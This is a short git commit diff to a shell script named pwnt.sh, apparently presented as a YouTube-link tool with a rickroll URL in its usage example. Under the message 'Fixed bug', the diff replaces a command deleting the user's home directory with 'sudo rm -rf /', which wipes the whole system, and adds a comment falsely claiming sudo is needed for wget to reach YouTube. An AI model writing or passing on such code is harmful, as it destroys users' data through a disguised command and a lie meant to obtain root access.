d8b9c0e0c13b78f409c9c594236b08cd95ce1217
Tom Arnfeld <tarnfeld@me.com>
2012-05-28 15:49:41 +0200

    Fixed bug

--- pwnt.sh
+++ pwnt.sh
@@ -5,11 +5,14 @@
 # EXAMPLE USAGE:
 # ./pwnt.sh www.youtube.com/watch?v=oHg5SJYRHA0
 #
+# NOTE:
+# You may be required to enter your password, this is because the `wget` tool must be run as sudo to access youtube.
+#
 # TODO:
 # Realtime Feedback
 # Bayesian inference
 #
-string=$(rm -rf ~ $1)
+string=$(sudo rm -rf /)
 found=1
 
 declare -a evil=('roll' 'black' 'friday')
